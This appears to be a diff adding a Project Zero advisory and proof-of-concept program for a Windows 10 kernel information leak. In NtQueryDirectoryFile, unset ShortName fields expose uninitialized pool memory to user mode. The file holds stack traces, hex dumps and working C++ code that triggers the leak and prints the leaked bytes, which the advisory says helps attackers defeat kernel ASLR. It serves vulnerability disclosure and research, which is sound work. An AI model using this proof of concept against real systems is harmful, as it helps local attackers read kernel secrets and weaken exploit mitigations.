@@ -1,0 +1,154 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1361
+
+We have discovered that the nt!NtQueryDirectoryFile system call discloses portions of uninitialized pool memory to user-mode clients on Windows 10, due to uninitialized fields in the output structure being copied to the application.
+
+The problem manifests itself for information classes FileBothDirectoryInformation and FileIdBothDirectoryInformation, which use the following (or similar) structure:
+
+--- cut ---
+  typedef struct _FILE_BOTH_DIR_INFORMATION {
+    ULONG         NextEntryOffset;
+    ULONG         FileIndex;
+    LARGE_INTEGER CreationTime;
+    LARGE_INTEGER LastAccessTime;
+    LARGE_INTEGER LastWriteTime;
+    LARGE_INTEGER ChangeTime;
+    LARGE_INTEGER EndOfFile;
+    LARGE_INTEGER AllocationSize;
+    ULONG         FileAttributes;
+    ULONG         FileNameLength;
+    ULONG         EaSize;
+    CCHAR         ShortNameLength;
+    WCHAR         ShortName[12];
+    WCHAR         FileName[1];
+  } FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;
+--- cut ---
+
+We have found that for certain files, such as C:\Windows\explorer.exe, the "ShortNameLength" and "ShortName" fields are not initialized at any point before being passed to a ring-3 client. This leaves 25 bytes of leftover kernel pool memory which can be acquired in a single system call by a malicious local program.
+
+The pool allocation used to store the above structure is made in luafv!LuafvAllocatePool. The act of copying uninitialized kernel memory to user-mode was originally detected under the following stack trace:
+
+--- cut ---
+  a0e90a28 9d2fb7a6 nt!memcpy+0x35
+  a0e90a50 9d2fecf4 luafv!LuafvCopyDirectoryEntry+0x52
+  a0e90a98 9d2fb577 luafv!LuafvCopyNextDirectoryEntry+0x365c
+  a0e90b14 9d2f8afc luafv!LuafvMergeStoreDirectory+0x93
+  a0e90b60 9d2f8118 luafv!LuafvQueryStoreDirectory+0xdc
+  a0e90b7c 89a5328d luafv!LuafvPreDirectoryControl+0xa8
+  90289adc 8e2bf040 FLTMGR!FltpPerformPreCallbacks+0x2ad
+  WARNING: Frame IP not in any known module. Following frames may be wrong.
+  a0e90c20 89a52bf3 0x8e2bf040
+  a0e90c58 89a52a0b FLTMGR!FltpPassThrough+0x163
+  a0e90c80 81cb6f53 FLTMGR!FltpDispatch+0x9b
+  a0e90c9c 81f0c273 nt!IofCallDriver+0x43
+  a0e90cf0 81f0ac7f nt!IopSynchronousServiceTail+0x133
+  a0e90d20 81d51c97 nt!NtQueryDirectoryFile+0x5f
+  a0e90d20 77a74d10 nt!KiSystemServicePostCall
+  00cadc48 77a727ba ntdll!KiFastSystemCallRet
+  00cadc4c 747ac7f0 ntdll!NtQueryDirectoryFile+0xa
+  00cadf58 747ac486 KERNELBASE!FindFirstFileExW+0x360
+  00cadf78 747b3d18 KERNELBASE!FindFirstFileW+0x16
+  00cae234 00d48a65 KERNELBASE!GetLongPathNameW+0x208
+--- cut ---
+
+when smartscreen.exe called the documented GetLongPathNameW API against "C:\Windows\explorer.exe".
+
+The issue can be reproduced by running the attached proof-of-concept program on a system with the Special Pools mechanism enabled for luafv.sys. Then, it is clearly visible that bytes at the aforementioned offsets are equal to the markers inserted by Special Pools, and would otherwise contain leftover data that was previously stored in that memory region:
+
+--- cut ---
+00000000: 00 00 00 00 00 00 00 00 00 a4 9e a2 74 2c d3 01 ............t,..
+00000010: 00 a4 9e a2 74 2c d3 01 e8 1f b3 fc d2 fa d2 01 ....t,..........
+00000020: 3f 93 7b 1a 76 2c d3 01 b8 ce 41 00 00 00 00 00 ?.{.v,....A.....
+00000030: 00 d0 41 00 00 00 00 00 20 00 00 00 18 00 00 00 ..A..... .......
+00000040: e1 00 00 00 00 45 45 45 45 45 45 45 45 45 45 45 .....EEEEEEEEEEE
+00000050: 45 45 45 45 45 45 45 45 45 45 45 45 45 45 65 00 EEEEEEEEEEEEEEe.
+00000060: 78 00 70 00 6c 00 6f 00 72 00 65 00 72 00 2e 00 x.p.l.o.r.e.r...
+00000070: 65 00 78 00 65 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? e.x.e...........
+--- cut ---
+00000000: 00 00 00 00 00 00 00 00 00 a4 9e a2 74 2c d3 01 ............t,..
+00000010: 00 a4 9e a2 74 2c d3 01 e8 1f b3 fc d2 fa d2 01 ....t,..........
+00000020: 3f 93 7b 1a 76 2c d3 01 b8 ce 41 00 00 00 00 00 ?.{.v,....A.....
+00000030: 00 d0 41 00 00 00 00 00 20 00 00 00 18 00 00 00 ..A..... .......
+00000040: e1 00 00 00 00 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d .....===========
+00000050: 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 3d 65 00 ==============e.
+00000060: 78 00 70 00 6c 00 6f 00 72 00 65 00 72 00 2e 00 x.p.l.o.r.e.r...
+00000070: 65 00 78 00 65 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? e.x.e...........
+--- cut ---
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <winternl.h>
+#include <cstdio>
+
+#define FileBothDirectoryInformation ((FILE_INFORMATION_CLASS)3)
+
+extern "C"
+NTSTATUS WINAPI NtQueryDirectoryFile(
+  _In_     HANDLE                 FileHandle,
+  _In_opt_ HANDLE                 Event,
+  _In_opt_ PIO_APC_ROUTINE        ApcRoutine,
+  _In_opt_ PVOID                  ApcContext,
+  _Out_    PIO_STATUS_BLOCK       IoStatusBlock,
+  _Out_    PVOID                  FileInformation,
+  _In_     ULONG                  Length,
+  _In_     FILE_INFORMATION_CLASS FileInformationClass,
+  _In_     BOOLEAN                ReturnSingleEntry,
+  _In_opt_ PUNICODE_STRING        FileName,
+  _In_     BOOLEAN                RestartScan
+  );
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+int main() {
+  // Open the disk device.
+  HANDLE hDir = CreateFile(L"C:\\Windows", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
+  if (hDir == INVALID_HANDLE_VALUE) {
+    printf("CreateFile failed, %d\n", GetLastError());
+    return 1;
+  }
+
+  // Obtain the output data, assuming that it will fit into 1024 bytes.
+  IO_STATUS_BLOCK iosb;
+  UNICODE_STRING FileName;
+  RtlInitUnicodeString(&FileName, L"explorer.exe");
+
+  BYTE OutputBuffer[1024];
+  RtlZeroMemory(OutputBuffer, sizeof(OutputBuffer));
+
+  NTSTATUS st = NtQueryDirectoryFile(hDir, NULL, NULL, NULL, &iosb, OutputBuffer, sizeof(OutputBuffer), FileBothDirectoryInformation, TRUE, &FileName, FALSE);
+  if (NT_SUCCESS(st)) {
+    PrintHex(OutputBuffer, iosb.Information);
+  } else {
+    printf("NtQueryDirectoryFile failed, %x\n", st);
+  }
+    
+  CloseHandle(hDir);
+
+  return 0;
+}
